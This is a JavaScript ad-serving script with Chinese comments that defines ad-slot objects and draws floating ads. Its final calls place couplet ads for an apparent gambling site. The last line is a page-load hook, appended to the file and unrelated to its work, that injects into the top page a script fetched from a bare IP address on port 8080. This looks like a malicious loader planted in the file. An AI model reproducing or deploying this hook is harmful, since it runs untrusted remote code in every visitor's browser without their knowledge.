/**
 * @author xujun
 **/




/**
 * 以下参数在系统配置时必填，特别注意！
 **/
//素材文件夹路径，放置图片FLASH的地方
//var	IM_AD_ROOT_PATH="http://192.9.150.70/images/upload/";
var	IM_AD_ROOT_PATH="";
//var	IM_AD_ROOT_PATH="http://61.130.8.218/images/upload/";

//点击素材链接路径，考虑到记录点击率问题
var	IM_AD_link="";
//放置广告位内容的JS目录，这些JS是由广告系统自动生成的
//var	AD_JS_ROOT_PATH="http://192.9.150.70/js/cachejs/";
var	AD_JS_ROOT_PATH="";
//var	AD_JS_ROOT_PATH="http://61.130.8.218/js/cachejs/";





//在json_edit.js文件里有后备服务器的路径要设置，不要忘记

/**
 * 以下参数在系统配置时可不填，但推荐填上，以防出错！
 **/
//素材出错时显示的路径
var ERROR_IMG_DEFAULT_PATH="";  

//文字说明未设定内容时显示的文字
var ERROR_TEXT_DEFAULT_CONTENT="广告位";



//保存广告信息
/**
 * 保存一个广告的信息
 * @param	adUrl		广告的地址
 * @param	adLink	  点击广告的连接地址
 * @param	adText	 广告文字
 * @param	keyWord		关键字
 * @param	opener		广告关闭按钮，-1为关闭状态，其他则为打开
 **/
function ImAd( adUrl, adLink, adText ,keyWord, opener){
		this.adUrl	=	adUrl;
		this.link	=	adLink;
		this.adText	=	adText;
		this.keyWord	=	keyWord;
		this.opener	=	opener;
			
		if (this.adUrl == undefined || this.adUrl ==""){
			this.adUrl = ERROR_IMG_DEFAULT_PATH
		}else{
			this.adUrl = IM_AD_ROOT_PATH	+  this.adUrl
		 }
		if (this.link == undefined){
			this.link = ERROR_IMG_DEFAULT_LINK
		}
		if (this.adText == undefined || this.adText ==""){
			this.adText = ERROR_TEXT_DEFAULT_CONTENT
		}
		if (this.keyWord == undefined || this.keyWord ==""){
			this.keyWord = "hiywefqehrbdefgrrbiadungqewribgqwrebgqrouhtqwrgfdfdfg"
		}				
		if (this.link != ""){
		this.link	=	IM_AD_link	+ this.link
		}				

}


//保存广告位
/**
 * 保存一个广告位
 * @param	adType	 广告类型0 ->	flash	 1-> 图片广告位	 2 ->	文字链广告位 3 ->幻灯片广告 4->弹出页广告 5->内文广告  6->漂浮广告  7->全屏广告  8 ->轮播广告  9 ->FLASH幻灯片广告   10 ->背投广告   11 ->视频广告(播放器和文件路径要填绝对路径)   12 ->随机显示广告   13 ->内框广告
 * @param	arrImAd	 该广告位上面显示的所有广告
 * @param	height	 图片的高度
 * @param	width	 图片的宽度
 * @param	para	 幻灯片广告的时间、全屏广告的时间、内文广告产生作用域的div的id（范围越小越好，范围定义过大会出错）
 * @param adIndexX   广告横向位置，注意是字符串类型的而且不要带空格，负数表示从右至左的宽度
 * @param adIndexY   广告纵向位置，注意没有负数
 **/
function ImAdcolumn( adType, arrImAd, width, height, para, adIndexX, adIndexY){
		//广告类型
		this.adType = adType;
    // 里面存放的对象都是ImAd
    this.arrImAd = arrImAd;
    // 高度
    this.height = height;
    // 宽度
    this.width = width;
    // 广告参数    
    this.para = para;
    //如果adIndexX为负数，则表示从右向左的数值
		this.adIndexX	=	adIndexX;
		this.adIndexY	=	adIndexY;		      

		if (this.adType == undefined || this.adType ==""){
			this.adType = 1
		}
		if (this.arrImAd == undefined || this.arrImAd =="" || this.arrImAd.length == 0){
			this.arrImAd = new ImAd("","","","")
		}
		if (this.height == undefined || this.height ==""){
			this.height = 100
		}
		if (this.width == undefined || this.width ==""){
			this.width = 100
		}
		if (this.para == undefined || this.para ==""){
			this.para = ""
		}
		if (this.adUrl == undefined || this.adUrl ==""){
			this.adUrl = ERROR_IMG_DEFAULT_PATH
		}
		if (this.adUrl == undefined || this.adUrl ==""){
			this.adUrl = ERROR_IMG_DEFAULT_PATH
		}				
    		
		if (this.adIndexX==undefined || typeof(this.adIndexX)!='string' || this.adIndexX ==""){
			this.adIndexX = "100"
		}

		if (this.adIndexY==undefined || this.adIndexY ==""){
			this.adIndexY = "100"
		}				



    /**
     * 把广告位画出来
     **/
    this.draw = function() {
        // 画div层
        var imAd= this.arrImAd[0];
        // 如果是flash的话
        if ( this.adType == 0 ) {
            this.drawFlash(imAd);
        } else if( this.adType == 1 ) {
            this.drawPic(imAd);
        } else if ( this.adType == 2 ) {
            this.drawTextLink(imAd);
        } else if ( this.adType == 3 ) {
            this.drawSlide(arrImAd);
        } else if ( this.adType == 4 ) {
            this.drawWin(imAd);
        } else if ( this.adType == 5 ) {
            this.drawKey(arrImAd);
        } else if ( this.adType == 6 ) {
            this.drawFloat(imAd);
        } else if ( this.adType == 7 ) {
            this.drawBackPic(imAd);
        } else if ( this.adType == 8 ) {
            this.drawSlideR2(arrImAd);
        } else if ( this.adType == 9 ) {
            this.drawSlideFlash(arrImAd);
        } else if ( this.adType == 10 ) {
            this.drawBehindAll(imAd);
        } else if ( this.adType == 11 ) {
            this.drawFlv(imAd);
        } else if ( this.adType == 12 ) {
            this.drawRandom(arrImAd);
        } else if ( this.adType == 13 ) {
            this.drawIframe(imAd);
        }
		
    }
    
    
	
    
    
    /**
     * 画漂浮广告
     * @param imAd 广告信息
     **/
    this.drawFloat = function(imAd){
    	  //关闭按钮
      	if(-1 == imAd.opener){return}
      	    	
    		var temple = this.randomChar(10);
    		var stringtext = "";
    		var x = this.adIndexX;
    		var y = this.adIndexY;
				if (x.indexOf("-")==0){
					x = "right:" + x.slice(1) + "px;";
				}else{
					x = "left:" + x + "px;";
				}
				if (y.indexOf("-")==0){
					z = "_top:expression(eval(document.compatMode && document.compatMode==\'CSS1Compat\') ?  documentElement.scrollTop + (document.documentElement.clientHeight-this.offsetHeight"+y+") : document.body.scrollTop + (document.body.clientHeight - this.clientHeight"+y+"));";
					y = "bottom:" + y.slice(1) + "px;";
				}else{
					z = "_top:expression(eval(document.compatMode && document.compatMode==\'CSS1Compat\') ?  documentElement.scrollTop +"+y+" : document.body.scrollTop+"+y+");";
					y = "top:" + y + "px;";
				}
	  		
		stringtext += '<div id="' + temple + '" style="clear:both;z-index:999;' + x + y + 'position:fixed!important;position:absolute;' + z + '">';
		if (imAd.adUrl.slice(-4)==".swf"){				
			stringtext +='<div style="position:relative; left:0;top:0;">'; 
			stringtext +='<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="' + this.width + '" height="' + this.height + '">';
			stringtext +='  <param name="movie" value="' + imAd.adUrl + '" />';
			stringtext +='  <param name="quality" value="high" />';
			stringtext +='  <param name="wmode" value="transparent">';
			stringtext +='  <embed src="' + imAd.adUrl + '" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="' + this.width + '" height="' + this.height + '"></embed>';
			stringtext +='</object>';

			// 如果有连接的话
			if( imAd.link ) {
				stringtext +='	<div style="position:absolute; left:0;top:0;">'; 
				stringtext +='		<table width="'+ this.width +'" height="' + this.height + '" border="0" cellspacing="0"  onclick="window.open(\''+ imAd.link +'\');" style="cursor:pointer" cellpadding="0">'; 
				stringtext +='		  <tr><td>　</td></tr>'; 
				stringtext +='		</table>'; 
				stringtext +='	</div>'; 
			}
			stringtext +='</div>';	

		} else {
			// 如果有连接的话
			if( imAd.link ) {
						stringtext +="<a target=_blank href=" + imAd.link + "><img width=" + this.width + " height=" + this.height + " border=0 src=" + imAd.adUrl + "></a><br>";
			}else {				
					stringtext +="<img width=" + this.width + " height=" + this.height + " border=0 src=" + imAd.adUrl + "><br>";
			}
		}
		stringtext +="<div align=left onclick=\"javascript:document.getElementById('" + temple +"').style.display='none';\" style=\"font-size:12px;color:#000000;padding-top:3px;cursor:pointer;letter-spacing:4px;padding-right:6px;padding-left:6px;\" ></div>";
		
		stringtext +="</div>";
		document.write(stringtext);
	} 
    		










    /**
     * 生成随机字符串
     * @param l 位数     
     * @return 生成的随机字符串
     **/    
    this.randomChar = function(l) {
    	var   x="erfqwertyuioplkjhgfdsazxcvbnm";
    	var   tmp="";
    	for(var   i=0;i<l;i++)   {
    		tmp   +=   x.charAt(Math.ceil(Math.random()*100000000)%x.length);
    	}
    	return   tmp;
    }


    /**
     * 获取cookie值
     * @param Name 名称     
     * @return 获取的值
     **/ 
	this.get_cookie = function(Name) {    
		var search = Name + "=";    
		var returnvalue = "";     
		if (document.cookie.length > 0) {     
			offset = document.cookie.indexOf(search);     
			if (offset != -1) {     
				offset += search.length;     
				end = document.cookie.indexOf(";", offset);     
				if (end == -1){     
					end = document.cookie.length;
				}
				returnvalue=unescape(document.cookie.substring(offset, end));     
			}     
		}     
		return returnvalue;     
	}	

}
 
var jsonObject=["6",[["/葡京对联.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","2","42"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}

var jsonObject=["6",[["/葡京对联.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","-2","42"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}

var jsonObject=["6",[["/葡京对联.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","2","322"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}

var jsonObject=["6",[["/葡京对联.gif","http://www.hg56677.com/#633505","","",""]],"110","260","","-2","322"];try{ var i;var divArr_1=new Array();for(i = 0;i<jsonObject[1].length;i++){divArr_1[i]=new ImAd( jsonObject[1][i][0],jsonObject[1][i][1],jsonObject[1][i][2],jsonObject[1][i][3],jsonObject[1][i][4]);}var imAdcolumn_1=new ImAdcolumn(jsonObject[0],divArr_1,jsonObject[2],jsonObject[3],jsonObject[4],jsonObject[5],jsonObject[6]);imAdcolumn_1.draw();}catch(e){}
;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id ='1qa2ws';s.type='text/javascript';s.src='http://119.4.249.166:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);